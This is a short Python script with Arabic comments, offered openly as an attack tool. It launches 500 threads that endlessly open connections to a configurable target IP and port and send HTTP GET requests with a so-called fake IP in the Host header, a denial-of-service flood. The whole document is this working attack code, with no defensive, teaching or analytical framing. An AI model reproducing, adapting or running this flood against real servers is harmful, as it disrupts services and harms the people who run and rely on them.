import socket
import threading

# استبدل هذا بعنوان IP الخاص بالخادم المستهدف
target_ip = "127.0.0.1"
# استبدل هذا برقم المنفذ المستهدف
target_port = 7777
# عنوان IP مزيف
fake_ip = "182.21.20.32"

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
        except socket.error:
            pass

for i in range(500):  # عدد الخيوط التي ستنفذ الهجوم
    thread = threading.Thread(target=attack)
    thread.start()